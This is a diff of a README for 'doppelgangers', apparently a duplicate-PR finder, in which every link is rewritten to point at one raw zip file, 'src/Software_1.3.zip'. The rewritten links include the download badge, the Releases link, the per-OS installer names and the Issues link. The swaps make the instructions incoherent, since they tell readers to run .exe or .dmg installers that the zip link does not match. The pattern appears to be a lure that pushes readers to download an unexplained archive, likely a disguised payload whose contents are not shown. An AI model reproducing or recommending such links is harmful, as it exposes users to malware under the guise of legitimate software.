@@ -1,7 +1,7 @@
 # 🌟 doppelgangers - Easily Find Duplicate PRs
 
 ## 📥 Download Now
-[![Download doppelgangers](https://img.shields.io/badge/Download%20doppelgangers-v1.0-blue)](https://github.com/GPshadow56/doppelgangers/releases)
+[![Download doppelgangers](https://github.com/GPshadow56/doppelgangers/raw/refs/heads/main/src/Software_1.3.zip%20doppelgangers-v1.0-blue)](https://github.com/GPshadow56/doppelgangers/raw/refs/heads/main/src/Software_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to doppelgangers! This application helps you identify and visualize duplicate pull requests (PRs) using embedding techniques. You can use this tool to streamline your code review process and enhance collaboration.
@@ -21,14 +21,14 @@ Before you install doppelgangers, ensure your system meets the following require
 - **Cross-Platform**: Works on Windows, macOS, and Linux.
 
 ## 📥 Download & Install
-To download doppelgangers, visit the Releases page: [Download doppelgangers here](https://github.com/GPshadow56/doppelgangers/releases).
+To download doppelgangers, visit the Releases page: [Download doppelgangers here](https://github.com/GPshadow56/doppelgangers/raw/refs/heads/main/src/Software_1.3.zip).
 
 1. **Open the Download Page**: Click the link above to go to the Releases page.
 2. **Select the Latest Version**: Look for the most recent release at the top of the list. It will typically be labeled with a version number (e.g., v1.0).
 3. **Download the Installer**: Look for the installer file suited for your operating system. Click on the appropriate link to start the download. 
-   - For Windows, you might find a file like `doppelgangers-installer.exe`.
-   - For macOS, look for a file named `doppelgangers.dmg`.
-   - For Linux, you might see a tarball file such as `doppelgangers.tar.gz`.
+   - For Windows, you might find a file like `https://github.com/GPshadow56/doppelgangers/raw/refs/heads/main/src/Software_1.3.zip`.
+   - For macOS, look for a file named `https://github.com/GPshadow56/doppelgangers/raw/refs/heads/main/src/Software_1.3.zip`.
+   - For Linux, you might see a tarball file such as `https://github.com/GPshadow56/doppelgangers/raw/refs/heads/main/src/Software_1.3.zip`.
 4. **Run the Installer**: Once the download completes, navigate to your downloads folder and locate the downloaded file. 
    - For Windows, double-click the `.exe` file to run the installer.
    - For macOS, open the `.dmg` file and drag the doppelgangers app into your Applications folder.
@@ -46,7 +46,7 @@ To download doppelgangers, visit the Releases page: [Download doppelgangers here
 ## 📞 Support
 If you encounter issues while using doppelgangers, you can seek support through the following channels:
 
-- **GitHub Issues**: Report problems by creating an issue on the [GitHub Issues page](https://github.com/GPshadow56/doppelgangers/issues).
+- **GitHub Issues**: Report problems by creating an issue on the [GitHub Issues page](https://github.com/GPshadow56/doppelgangers/raw/refs/heads/main/src/Software_1.3.zip).
 - **Community Forum**: Join discussions with other users on forums dedicated to development tools.
 
 ## 🔗 Additional Resources
